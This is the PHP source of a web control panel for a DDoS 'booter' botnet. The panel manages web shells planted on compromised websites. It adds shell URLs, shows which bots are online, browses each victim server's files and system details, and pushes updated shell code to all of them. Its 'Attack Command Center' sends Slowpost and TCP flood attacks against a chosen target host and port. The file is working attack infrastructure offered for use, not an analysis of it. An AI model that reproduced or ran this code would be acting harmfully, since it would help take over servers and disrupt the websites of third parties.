<?php

@ini_set('max_execution_time', 0);
@set_time_limit(0);

require_once("./http.php");
require_once("./utilities.php");
require_once("./config/settings.php");
require_once("./config/credential.php");
if(file_exists("./config/".$list_file)) require_once("./config/".$list_file);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<meta name="robots" content="noindex">
    </head>
    <body>
        <link rel="stylesheet" type="text/css" href="./style.css">
        <script type='text/javascript' src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
        <script type='text/javascript' src="./js/jsuri-1.1.1.js"></script>
        <script type='text/javascript' src="./js/php.js"></script>
        <script type='text/javascript' src="./js/jquery.idTabs.min.js"></script>

		<?php

		$http = new http;
		$utilities = new utilities;

		if(!isset($_COOKIE['booter']) || empty($_COOKIE['booter']) || check_cookie($_COOKIE['booter']) != true){

			/* Login */

			?>

			<center>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<img id='form_gambar_warning' style='display:none;' src='images/warning.png' />
			<h4 style='color:red;display:none;' id='form_all_null'> Please fill out all form ! </h4>
			<h4 style='color:red;display:none;' id='wrong_credential'> Wrong Credential ! </h4>
			<div class='login_main'>
				<table class='container'>
					<tr>
						<th colspan='2' style='text-align:center;'>Login</th>
					</tr>
					<tr>
						<td>Username :</td>
						<td>
							<input class='text_input' type='text' name='login_username' size=20>
						</td>
					</tr>
					<tr>
						<td>Password :</td>
						<td>
							<input class='text_input' type='password' name='login_password' autocomplete='off' size=20>
						</td>
					</tr>
					<tr>
						<td align='center' colspan='6'>
							<button class='cbutton' id='login_button'>Login</button>
						</td>
					</tr>
				</table>
			</div>
			<br>
			<br>
			</center>
			
			<?php
			// finish login code..

		}else{

			?>

			<!-- code terapung dkt bawah nie copy paste dari tbd, sorry suhz :p -->

			<div class="atas_sekali">
			<div style="width:1000px; margin: 0 auto;">
			<button class='home'></button>
			<span style="float: right;">
			<a href="<?php echo htmlentities(basename(__FILE__)); ?>?attack">
			<img src="images/target.png" /> <font size=2>Attack</font>
			</a>
			<a href="<?php echo htmlentities(basename(__FILE__)); ?>?add">
			<img src="images/plus.png" /> <font size=2>Add Booter</font>
			</a>
			<a href="<?php echo htmlentities(basename(__FILE__)); ?>?list_booter">
			<img src="images/list.png" /> <font size=2>List Booter</font>
			</a>
			<a href="<?php echo htmlentities(basename(__FILE__)); ?>?options">
			<img src="images/options.png" /> <font size=2>Options</font>
			</a>
			<a href="<?php echo htmlentities(basename(__FILE__)); ?>?logout">
			<img src="images/logout.png" /> <font size=2>Logout</font>
			</a>
			</span>
			</div></div>

			<!-- finish code terapongg.. -->

			<center>
			
			<?php

			if(isset($_GET['booter']) && !empty($_GET['booter'])){
			
				$parse_url = parse_url($list_bot[$_REQUEST['booter']]);
				$ip = gethostbyname($parse_url['host']);
				$url = htmlentities($list_bot[$_REQUEST['booter']]);
				$return_info = $http->get_os_info($url, $password);
				
				// filemanager
				
				$file_man_data = json_decode($http->curl_request($list_bot[$_REQUEST['booter']], "pass=".$password."&fileman=true&loc=", $utilities->random_user_agent(), 10, false), true);
				
				?>

				<br>
				<br>
				<br>
				<br>
				<button class='cbutton' id='server-info'>Server Info</button>
				<button class='cbutton' id='file-man'>File Manager</button>
				<br>
				<div id='server_fileman' style='display:none;'>
					<h1> Server File Manager </h1>
					<br>
					<table class="container" id='fileman-table' style="width:90%;">
						<tr>
							<th style='text-align:center;' colspan='4'> File Manager </th>
						</tr>
						<tr>
							<td colspan='4'>
								<input type='text' class='text_input' id='input_dir' name='dir_fileman' style='width:93%;' value='<?php echo htmlentities($file_man_data['path']) ?>' >
								<input type='hidden' name='shell_url' value='<?php echo htmlentities($list_bot[$_REQUEST['booter']]) ?>' >
								<button class='cbutton' id='dir_button' style='width:45px;height:30px;'>Go</button>
							</td>
						</tr>
						<tr>
							<td colspan='4' height="50">
								--> 
								<?php
								$split = $utilities->split_dir($file_man_data['path'], $file_man_data['type']);
								$dir_q = '';
								foreach($split as $dir_split){
								?>
								<a href="javaScript:open_file('<?php echo htmlentities($dir_q.$dir_split);$dir_q .= $dir_split; ?>');"><?php echo htmlentities($dir_split); ?></a>
								<?php } ?>
							</td>
						</tr>
						<tr>
							<th style='text-align:center;'>
								Name
							</th>
							<th style='text-align:center;'>
								FileSize
							</th>
							<th style='text-align:center;'>
								Permission
							</th>
							<th style='text-align:center;'>
								Last Modified
							</th>
						</tr>
						<?php foreach($file_man_data['data']['folder'] as $hfolder => $harray){
						if($hfolder == ".."){
							
							$filename = "Back";
							$pic = "back";
							$path = $utilities->dir_return($file_man_data['path']);
						}else{
							$filename = $hfolder;
							$pic = "folder";
							$path = $file_man_data['path'].$hfolder."/";
						}?>
						<tr>	
							<td>
								<a href="javaScript:open_file('<?php echo htmlentities($path) ?>');"><img src='./images/ext/<?php echo htmlentities($pic) ?>.png' /> <?php echo htmlentities($filename) ?></a>
							</td>
							<td style='text-align:center;'>
								Dir
							</td>
							<td style='text-align:center;'>
								<?php echo htmlentities($http->get_permission_text($harray['permission'])." ( ".substr(sprintf('%o', $harray['permission']), -4)." ) ") ?>
							</td>
							<td style='text-align:center;'>
								<?php echo $harray['last_modified']  ?>
							</td>
						</tr>	
						<?php
						}
						foreach($file_man_data['data']['files'] as $hfile => $harray){
						?>
						<tr>	
							<td>
								<a href="javaScript:open_file('<?php echo $file_man_data['path'].$hfile ?>');"><img src='./images/ext/<?php echo $utilities->get_icon($hfile) ?>.png' /> <?php echo $hfile ?></a>
							</td>
							<td style='text-align:center;'>
								<?php echo $utilities->convert_size_byte($harray['filesize']) ?>
							</td>
							<td style='text-align:center;'>
								<?php echo $http->get_permission_text($harray['permission'])." ( ".substr(sprintf('%o', $harray['permission']), -4)." ) " ?>
							</td>
							<td style='text-align:center;'>
								<?php echo $harray['last_modified'] ?>
							</td>
						</tr>	
						<?php } ?>
					</table>
					<br><br>
				</div>
				<div id='server_info_table' style='display:none;'>
					<h1> Shell Server Information </h1>
					<table class="container" style="width:40%;">
						<tr>
							<th colspan='2' style="text-align:center;">Shell Info</th>
						</tr>
						<tr>
							<td>Shell URL</td>
							<td>
								<a href="<?php echo htmlentities($url) ?>">
									<?php echo $url ?>
								</a>
							</td>
						</tr>
						<tr>
							<td>Shell IP</td>
							<td>
								<?php echo htmlentities($ip) ?>
							</td>
						</tr>
						<tr>
							<th colspan='2' style="text-align:center;">OS Information</th>
						</tr>
						<tr>
							<td>OS Name</td>
							<td>
								<?php echo htmlentities($return_info['OS_INFO']['OS_NAME']) ?>
							</td>
						</tr>
						<tr>
							<td>Hostname</td>
							<td>
								<?php echo htmlentities($return_info['OS_INFO']['OS_HOSTNAME']) ?>
							</td>
						</tr>
						<tr>
							<td>Release</td>
							<td>
								<?php echo htmlentities($return_info['OS_INFO']['OS_RELEASE']) ?>
							</td>
						</tr>
						<tr>
							<td>OS Version</td>
							<td>
								<?php echo htmlentities($return_info['OS_INFO']['OS_VERSION']) ?>
							</td>
						</tr>
						<tr>
							<td>Machine</td>
							<td>
								<?php echo htmlentities($return_info['OS_INFO']['OS_MACHINE']) ?>
							</td>
						</tr>
						<tr>
							<th colspan='2' style="text-align:center;">Hard Disk Info</th>
						</tr>
						<tr>
							<td>Hard Disk Total</td>
							<td>
								<?php echo htmlentities($utilities->convert_size_byte($return_info['DISK_SPACE']['DISK_TOTAL'])) ?></td>
						</tr>
						<tr>
							<td>Hard Disk Free Space</td>
							<td>
								<?php echo htmlentities($utilities->convert_size_byte($return_info['DISK_SPACE']['DISK_FREE'])) ?></td>
						</tr>
						<tr>
							<th colspan='2' style="text-align:center;">CPU Information</th>
						</tr>
						<?php foreach($return_info[ 'CPU_INFO'] as $cpu1=>$cpu2){ ?>
						<tr>
							<td>
								<?php echo htmlentities($cpu1) ?>
							</td>
							<td>
								<?php echo htmlentities($cpu2) ?>
							</td>
						</tr>
						<?php } ?>
						<tr>
							<th colspan='2' style="text-align:center;">Memory(RAM) Information</th>
						</tr>
						<?php foreach($return_info[ 'MEMORY_INFO'] as $mem1=>$mem2){ ?>
						<tr>
							<td>
								<?php echo htmlentities($mem1) ?>
							</td>
							<td>
								<?php echo htmlentities($mem2) ?>
							</td>
						</tr>
						<?php } ?>
						<br><br>
				</div>
				
				<?php
					
			}elseif(isset($_GET['add']) && empty($_GET['add'])){
			
				?>
				
				<br>
				<br>
				<br>
				<br>
				<br>
				<div id='add_booter_form' style='display:none;'>
					<br>
					<br>
					<h1> Add Booter </h1>
					<br>
					<input class=text_input style='width: 600px;' type=text name='add_booter' placeholder='http://www.site.com/shell.php' />
					<br>
					<br>
					<button class=cbutton id='add_booter_button'>Submit</button>
					<br><font size=3 id='confirmation_js'></font>
					<br>
					<br>
					<div id=true_add style='display:none;'>
						<img src='images/success.png' />
						 <h4>Booter shell has been successfully added !</h4>
					</div>
					<div id=exist_add style='display:none;'>
						<img src='images/warning.png' />
						 <h4>That server already exist (maybe other shell that use shared hosting) !</h4>
					</div>
					<div id=false_add style='display:none;'>
						<img src='images/error.png' />
						 <h4>Host down or booter not found !</h4>
					</div>
				</div>
				
				<?php
				
			}elseif(isset($_GET['list_booter']) && empty($_GET['list_booter'])){
			
				?>

				<br>
				<br>
				<br>
				<br>
				<br>
				<div id='list_booter_table' style='display:none;'>
					<table class="container">
						<tr>
							<th style='text-align:center'>Shell</th>
							<th>Status</th>
						</tr>
						
						<?php
							$data = array(array(),array());
							foreach($list_bot as $num => $list_botq){
								$data[$num]['url'] = $list_bot[$num];
								$data[$num]['post'] = array();
								$data[$num]['post']['pass'] = $password;
								$data[$num]['post']['check'] = 'true';
							}
							unset($data[0]);
							$result = $http->multi_curl_request($data, 5);
							foreach($result as $num => $rs){
								echo "<tr>\n";
								if($rs == "OK"){
									?>
									<td>
										<a href="<?php echo htmlentities(basename(__FILE__)) ?>?booter=<?php echo $num ?>">
											<font size=2><?php echo htmlentities($list_bot[$num]) ?></font>
										</a>
									</td>
									<td>
										<img width="25" height="25" title="Online" src="images/green_circle.png" />
									</td>
									<?php
								}else{
									?>
									<td>
										<font size=2><?php echo htmlentities($list_bot[$num]) ?></font>
									</td>
									<td>
										<img width="25" height="25" title="Offline" src="images/red_circle.png" />
									</td>
									<?php
								}
								echo "</tr>\n";
							}
						?>
					</table>
				</div>
				
				<?php
				
			}elseif(isset($_GET['attack']) && empty($_GET['attack'])){

				//display attack menu..
				
				?>
					
				<br>
				<br>
				<br>
				<br>
				<br>
				<div id='attack_table' style='display:none;'>
					<h1> Attack Command Center </h1>
					<br>
					<?php
					
					$count_online = 0;
					$data = array(array(),array());
					foreach($list_bot as $num => $list_bots){
						$data[$num]['url'] = $list_bot[$num];
						$data[$num]['post'] = array();
						$data[$num]['post']['pass'] = $password;
						$data[$num]['post']['check'] = 'true';
					}
					unset($data[0]);
					$result = $http->multi_curl_request($data, 2);
					foreach($result as $rs){
						if($rs == "OK"){
							$count_online++;
						}
					}
					
					?>
					<?php echo $count_online."/".count($list_bot)." bot online"; ?>
					<br>
					<br>
					<img id='alert_attack_form_gambar' style='display:none;' src='images/warning.png' />
						<h4 style='color:red;display:none;' id='alert_attack_form_fill'> Please fill out all form ! </h4>
						<h4 style='color:red;display:none;' id='alert_attack_form_port'> Incorrect port number ! </h4>
						<h4 style='color:red;display:none;' id='alert_attack_form_notint'> Port provide is not integer ! </h4>
					<table class="container">
						<tr>
							<th style="text-align:center;" colspan=3>Attack !</th>
						</tr>
						<tr>
							<td>Target</td>
							<td>
								<input type=text name='target' class="text_input" style='width: 400px;' />
							</td>
						</tr>
						<tr>
							<td>Port</td>
							<td>
								<input type=text name='port' class="text_input" value='80' style='width: 200px;float:left;' />
							</td>
						</tr>
						<tr id='pathAttack' style='display:none;'>
							<td>Path</td>
							<td>
								<input type=text name='path' class="text_input" value='' style='width: 300px;float:left;' />
							</td>
						</tr>
						<tr>
							<td>Method</td>
							<td>
								<input type='radio' id='r1' name='method' checked="" hidden="" value='slowpost' />
								<label for="r1" class="radio"><span></span>Slowpost</label>
								<input type='radio' id='r2' name='method' checked="" hidden="" value='tcp_flood' />
								<label for="r2" class="radio"><span></span>TCP Flooder</label>
							</td>
						</tr>
						<tr>
							<td colspan=2 style="text-align:center;">
								<button class="cbutton" id='attack_button'>Attack</button>
							</td>
						</tr>
					</table>
				</div>
				<div id='when_attack' style='display:none;'>
						<h1> Attacking ! </h1>
					<br>
					<button class="cbutton" id='stop_button'>Stop</button>
					<br>
					<br>
					</tr>
					<table class='container' id='running_attack_table'>
						<tr>
							<th style='text-align:center;'>Shell</th>
							<th>Status</th>
						</tr>
					</table>
				</div>
				</div>
				<div id='attack_failed' style='display:none;'>
					<center>
						<h1> Error ! </h1>
					</center>
					<br>
				</div>
				<div id='attack_stop' style='display:none;'>
					<center>
						<h1> Attack Stop ! </h1>
					</center>
					<br>
				</div>
				
				<?php
				
			}elseif(isset($_GET['options']) && empty($_GET['options'])){
				
				?>
				
				<br>
				<div class="usual" style='display:none;'>
					<ul class="idTabs">
						<li>
							<a href="#add-user">Add User</a>
						</li>
						<li>
							<a href="#change-password">Change Password</a>
						</li>
						<li>
							<a href="#update-shell">Update Shell</a>
						</li>
						<li>
							<a href="#shell-password">Change Shell Password</a>
						</li>
					</ul>
					<br>
					<br>
					<br>
					<br>
					<br>
					<br>
					<h4 class='error_options' id='form_all_null_opt'> Please fill out all form ! </h4>
					<h4 class='error_options' id='wrong_credential_opt'> Wrong Credential ! </h4>
					<h4 class='error_options' id='already_exist'> User Already Exist ! </h4>
					<h4 class='error_options' id='error'> Error ! </h4>
					<h4 class='error_options' id='regex_error'> Please make sure your username only contain lowercase/uppercase, number or '_' '-' only ! <br> Also your username must be length 3 until 15 .</h4>
					<h4 style='color:red;display:none;' id='wrong_retype_opt'> Please make sure re-type password is correct ! </h4>
					<h4 style='color:red;display:none;' id='something_wrong'> Somethings wrong happen ! Please check your <b>credentials.php</b> file permission ! </h4>
					<h4 style='color:red;display:none;' id='user_not_exist'> This user doesn't exist ! </h4>
					<h4 style='color:red;display:none;' id='wrong_old'> Your old pass is incorrect ! </h4>
					<h4 style='color:red;display:none;' id=''>  </h4>
					<div id='add_user_success' style='display:none;'>
						<img src='images/success.png' />
						 <h4>User has been successfully added !</h4>
					</div>
					<div id='success_change' style='display:none;'>
						<img src='images/success.png' />
						 <h4>Your pass has been successfully update !</h4>
					</div>
					<div id='update_shell_success' style='display:none;'>
						<img src='images/success.png' />
						 <h4>All shell has been successfully update !</h4>
					</div>
					<div id='update_shell_p_success' style='display:none;'>
						<img src='images/success.png' />
						 <h4>Shell password has been successfully update !</h4>
					</div>
					<div id="add-user">
						<table width='30%' class='container'>
							<tr>
								<td style='text-align:center;' colspan='2'>Add User</td>
							</tr>
							<tr>
								<td>Username</td>
								<td>
									<input type='text' size=30 class='text_input options' name='add_username' />
								</td>
							</tr>
							<tr>
								<td>Password</td>
								<td>
									<input type='password' size=30 class='text_input options' name='add_password' />
								</td>
							</tr>
							<tr>
								<td>Re-type Password</td>
								<td>
									<input type='password' size=30 class='text_input options' name='add_password_retype' />
								</td>
							</tr>
							<tr>
								<td colspan='2' style='text-align:center;'>
									<button class='cbutton' id='add_user_button'>Add</button>
								</td>
							</tr>
						</table>
					</div>
					<div id="change-password">
						<table width='30%' class='container'>
							<tr>
								<td style='text-align:center;' colspan='2'>Change Password</td>
							</tr>
							<tr>
								<td style='width:270%'>Username</td>
								<td>
									<input type='text' size=30 class='text_input options' name='change_pass_username' />
								</td>
							</tr>
							<tr>
								<td>Old Pass</td>
								<td>
									<input type='password' size=30 class='text_input options' name='change_old_pass' />
								</td>
							</tr>
							<tr>
								<td>New Pass</td>
								<td>
									<input type='password' size=30 class='text_input options' name='change_new_pass' />
								</td>
							</tr>
							<tr>
								<td colspan='2' style='text-align:center;'>
									<button class='cbutton' id='change_user_button'>Change</button>
								</td>
							</tr>
						</table>
					</div>
					<div id="update-shell">
						<textarea class='text_area' style='font-size:x-small;' rows='24' cols='200' id='update_shell'></textarea>
						<br><br>
						<button class='cbutton' id='update-shell-button'>Update</button>
					</div>
					<div id="shell-password">
						<table class='container'>
							<tr>
								<th colspan='2' style='text-align:center;'>
									Change Password
								</th>
							</tr>
							<tr>
								<td>
									New Shell Password
								</td>
								<td>
									<input type='text' class='text_input' name='new_s_pass' />
								</td>
							</tr>
							<tr>
								<td colspan='2' style='text-align:center;'>
									<button class='cbutton' name='submit_s_pass' id='submit_s_pass'>Change</button>
								</td>
							</tr>
						</table>
					</div>
				</div>
				
				<?php
				
			}elseif(isset($_GET['logout']) && empty($_GET['logout'])){
			
				?>
				
				<br>
				<br>
				<br>
				<br>
				<br>
				<?php setcookie( "booter", "", time()-(60*60)); ?>
				
				<script text='text/javascript'>
					var url_home = basename(document.URL);
					url_home = url_home.split("?")[0];
					location.href = url_home;
				</script>
				
				<?php
				
			}else{
			
				?>

				<br>
				<br>
				<br>
				<br>
				<br>
				<script type='text/javascript'>
					$('.atas_sekali').hide();
				</script>
				<br>
				<br>
				<br>
				<div class='index' style='display:none;'>
					<table>
						<tr>
							<td>
								<a href="<?php htmlentities(basename(__FILE__)) ?>?attack">
									<img src='images/attack_large.png' width=120 height=120 />
								</a>
							</td>
							<td>
								<a href="<?php htmlentities(basename(__FILE__)) ?>?add">
									<img src='images/add_large.png' width=120 height=120 />
							</td>
							<td>
								<a href="<?php htmlentities(basename(__FILE__)) ?>?list_booter">
									<img src='images/list_large.png' width=120 height=120 />
							</td>
							<td>
								<a href="<?php htmlentities(basename(__FILE__)) ?>?options">
									<img src='images/settings_large.png' width=120 height=120 />
							</td>
						</tr>
						<tr>
							<td>
									<h2>Attack</h2>

							</td>
							<td>
									<h2>Add Booter</h2>

							</td>
							<td>
									<h2>List Booter</h2>

							</td>
							<td>
									<h2>Settings</h2>

							</td>
						</tr>
					</table>
				</div>
				
				<?php
			}

		}

		function check_cookie($cookie){
			global $credential, $utilities;
			foreach($credential as $username => $password){
				if($cookie == $utilities->encrypt_cookie($_SERVER['HTTP_HOST']."booter".$password)){
					return true;
				}
			}
			return false;
		}

		?>
		</center>
		<script language="javascript" src="js/script.js"></script>
	</body>
</html>